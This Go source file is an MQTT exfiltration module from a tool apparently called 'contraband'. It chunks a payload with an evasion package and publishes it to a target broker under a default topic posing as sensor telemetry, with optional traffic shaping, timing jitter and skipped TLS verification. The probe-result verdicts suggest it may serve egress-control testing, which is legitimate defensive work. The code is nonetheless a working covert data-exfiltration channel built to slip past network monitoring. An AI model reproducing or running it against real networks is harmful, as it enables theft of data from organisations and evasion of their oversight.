package covert

import (
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"strconv"
	"time"

	"github.com/shehzade/contraband/pkg/client/evasion"
	"github.com/shehzade/contraband/pkg/client/exfil"
	"github.com/shehzade/contraband/pkg/common"
)

func init() {
	exfil.RegisterExfiltrator(common.ProtoMQTT, NewMQTTExfiltrator())
}

// MQTTExfiltrator implements MQTT v3.1.1 CONNECT / PUBLISH QoS 1 / PUBACK streaming over TCP and TLS.
type MQTTExfiltrator struct{}

func NewMQTTExfiltrator() *MQTTExfiltrator {
	return &MQTTExfiltrator{}
}

func (e *MQTTExfiltrator) Protocol() string {
	return common.ProtoMQTT
}

// EncodeMQTTLength encodes variable length integer per MQTT v3.1.1 spec.
func EncodeMQTTLength(length int) []byte {
	var encoded []byte
	for {
		digit := byte(length % 128)
		length = length / 128
		if length > 0 {
			digit |= 0x80
		}
		encoded = append(encoded, digit)
		if length == 0 {
			break
		}
	}
	return encoded
}

// DecodeMQTTLength reads a variable length integer from an io.Reader.
func DecodeMQTTLength(r io.Reader) (int, error) {
	multiplier := 1
	value := 0
	buf := make([]byte, 1)
	for {
		if _, err := io.ReadFull(r, buf); err != nil {
			return 0, err
		}
		digit := buf[0]
		value += int(digit&0x7F) * multiplier
		if (digit & 0x80) == 0 {
			break
		}
		multiplier *= 128
		if multiplier > 128*128*128 {
			return 0, fmt.Errorf("malformed MQTT remaining length")
		}
	}
	return value, nil
}

// BuildMQTTConnect creates an MQTT v3.1.1 CONNECT packet.
func BuildMQTTConnect(clientID string) []byte {
	var varHeader bytes.Buffer
	varHeader.Write([]byte{0x00, 0x04, 'M', 'Q', 'T', 'T'}) // Protocol Name
	varHeader.WriteByte(0x04)                               // Protocol Level v3.1.1
	varHeader.WriteByte(0x02)                               // CleanSession = 1
	varHeader.Write([]byte{0x00, 0x3C})                     // KeepAlive = 60s

	var payload bytes.Buffer
	clientBytes := []byte(clientID)
	binary.Write(&payload, binary.BigEndian, uint16(len(clientBytes)))
	payload.Write(clientBytes)

	totalLen := varHeader.Len() + payload.Len()
	var packet bytes.Buffer
	packet.WriteByte(0x10) // Packet Type: CONNECT
	packet.Write(EncodeMQTTLength(totalLen))
	packet.Write(varHeader.Bytes())
	packet.Write(payload.Bytes())

	return packet.Bytes()
}

// BuildMQTTPublish creates an MQTT v3.1.1 PUBLISH packet (QoS 0 or 1).
func BuildMQTTPublish(topic string, packetID uint16, qos byte, payload []byte) []byte {
	var varHeader bytes.Buffer
	topicBytes := []byte(topic)
	binary.Write(&varHeader, binary.BigEndian, uint16(len(topicBytes)))
	varHeader.Write(topicBytes)

	if qos > 0 {
		binary.Write(&varHeader, binary.BigEndian, packetID)
	}

	totalLen := varHeader.Len() + len(payload)
	var packet bytes.Buffer
	headerByte := byte(0x30 | ((qos & 0x03) << 1)) // Type 3 (PUBLISH) + QoS
	packet.WriteByte(headerByte)
	packet.Write(EncodeMQTTLength(totalLen))
	packet.Write(varHeader.Bytes())
	packet.Write(payload)

	return packet.Bytes()
}

// BuildMQTTDisconnect creates an MQTT DISCONNECT packet.
func BuildMQTTDisconnect() []byte {
	return []byte{0xE0, 0x00}
}

func (e *MQTTExfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	payload, err := io.ReadAll(reader)
	if err != nil {
		return nil, fmt.Errorf("failed to read payload: %w", err)
	}
	result.TargetVolume = int64(len(payload))

	if opts.ExpectedHash == "" {
		h := sha256.Sum256(payload)
		opts.ExpectedHash = hex.EncodeToString(h[:])
	}
	result.PayloadHash = opts.ExpectedHash

	if opts.SessionToken.IsZero() {
		tok, tokErr := common.NewSessionToken()
		if tokErr != nil {
			return nil, tokErr
		}
		opts.SessionToken = tok
	}

	chunks, err := evasion.ChunkPayload(payload, opts.SessionToken, opts.ChunkSize)
	if err != nil {
		return nil, fmt.Errorf("failed to chunk payload: %w", err)
	}

	targetAddr := net.JoinHostPort(opts.TargetHost, strconv.Itoa(opts.TargetPort))
	useTLS := opts.UseTLS || opts.TargetPort == 8883

	var conn net.Conn
	var dialErr error
	if useTLS {
		tlsConf := &tls.Config{
			ServerName:         opts.TargetHost,
			InsecureSkipVerify: opts.InsecureTLS,
		}
		d := &net.Dialer{Timeout: opts.Timeout}
		conn, dialErr = tls.DialWithDialer(d, "tcp", targetAddr, tlsConf)
		if dialErr == nil {
			result.Timestamps.HandshakeTLS = time.Now().UTC()
		}
	} else {
		d := net.Dialer{Timeout: opts.Timeout}
		conn, dialErr = d.DialContext(ctx, "tcp", targetAddr)
	}

	if dialErr != nil {
		result.Verdict = classifyCovertError(dialErr)
		result.ErrorMessage = dialErr.Error()
		calculateCovertDurations(&result)
		return &result, dialErr
	}
	defer conn.Close()

	result.Timestamps.ConnectedTCP = time.Now().UTC()
	result.Timestamps.FirstByteSent = time.Now().UTC()

	// Step 1: Send CONNECT
	clientID := fmt.Sprintf("ctrb_%s", opts.SessionToken.String()[:8])
	connPkt := BuildMQTTConnect(clientID)
	if _, err := conn.Write(connPkt); err != nil {
		result.Verdict = classifyCovertError(err)
		result.ErrorMessage = fmt.Sprintf("failed to send MQTT CONNECT: %v", err)
		calculateCovertDurations(&result)
		return &result, err
	}
	result.BytesSent += int64(len(connPkt))

	// Step 2: Read CONNACK (0x20, 0x02, returnCode, sessionPresent)
	_ = conn.SetReadDeadline(time.Now().Add(opts.Timeout))
	connack := make([]byte, 4)
	if _, err := io.ReadFull(conn, connack); err != nil {
		result.Verdict = classifyCovertError(err)
		result.ErrorMessage = fmt.Sprintf("failed to read MQTT CONNACK: %v", err)
		calculateCovertDurations(&result)
		return &result, err
	}
	result.BytesRecv += 4

	if connack[0] != 0x20 || connack[3] != 0x00 { // 0x00 = Connection Accepted
		err := fmt.Errorf("MQTT connection refused by broker: code 0x%02X", connack[3])
		result.Verdict = common.VerdictBlockedL7
		result.ErrorMessage = err.Error()
		calculateCovertDurations(&result)
		return &result, err
	}

	topic := opts.Headers["topic"]
	if topic == "" {
		topic = "telemetry/sensor/data"
	}

	// Step 3: Stream Chunks via PUBLISH QoS 1
	for i, chunkFrame := range chunks {
		packetID := uint16(i + 1)

		if opts.Shaper != nil {
			if err := opts.Shaper.WaitN(ctx, len(chunkFrame)); err != nil {
				result.Verdict = classifyCovertError(err)
				result.ErrorMessage = err.Error()
				calculateCovertDurations(&result)
				return &result, err
			}
		}
		if opts.Cadence != nil {
			delay := opts.Cadence.NextDelay()
			if delay > 0 {
				select {
				case <-time.After(delay):
				case <-ctx.Done():
					result.Verdict = classifyCovertError(ctx.Err())
					result.ErrorMessage = ctx.Err().Error()
					calculateCovertDurations(&result)
					return &result, ctx.Err()
				}
			}
		}

		pubPkt := BuildMQTTPublish(topic, packetID, 1, chunkFrame)
		if _, err := conn.Write(pubPkt); err != nil {
			result.Verdict = classifyCovertError(err)
			result.ErrorMessage = fmt.Sprintf("failed to send MQTT PUBLISH for chunk %d: %v", packetID, err)
			calculateCovertDurations(&result)
			return &result, err
		}
		result.BytesSent += int64(len(pubPkt))

		// Read PUBACK (0x40, 0x02, pid_high, pid_low)
		_ = conn.SetReadDeadline(time.Now().Add(opts.Timeout))
		puback := make([]byte, 4)
		if _, err := io.ReadFull(conn, puback); err != nil {
			result.Verdict = classifyCovertError(err)
			result.ErrorMessage = fmt.Sprintf("failed to read MQTT PUBACK for chunk %d: %v", packetID, err)
			calculateCovertDurations(&result)
			return &result, err
		}
		result.BytesRecv += 4

		if puback[0] != 0x40 {
			err := fmt.Errorf("unexpected MQTT packet type: 0x%02X (expected PUBACK 0x40)", puback[0])
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = err.Error()
			calculateCovertDurations(&result)
			return &result, err
		}
	}

	// Step 4: Send DISCONNECT
	discPkt := BuildMQTTDisconnect()
	_, _ = conn.Write(discPkt)
	result.BytesSent += int64(len(discPkt))

	result.Timestamps.AckReceived = time.Now().UTC()
	result.Timestamps.TeardownDone = time.Now().UTC()
	result.Verdict = common.VerdictSuccess
	result.RawEvidence = common.FormatBoundedRawEvidence(payload)
	calculateCovertDurations(&result)

	return &result, nil
}
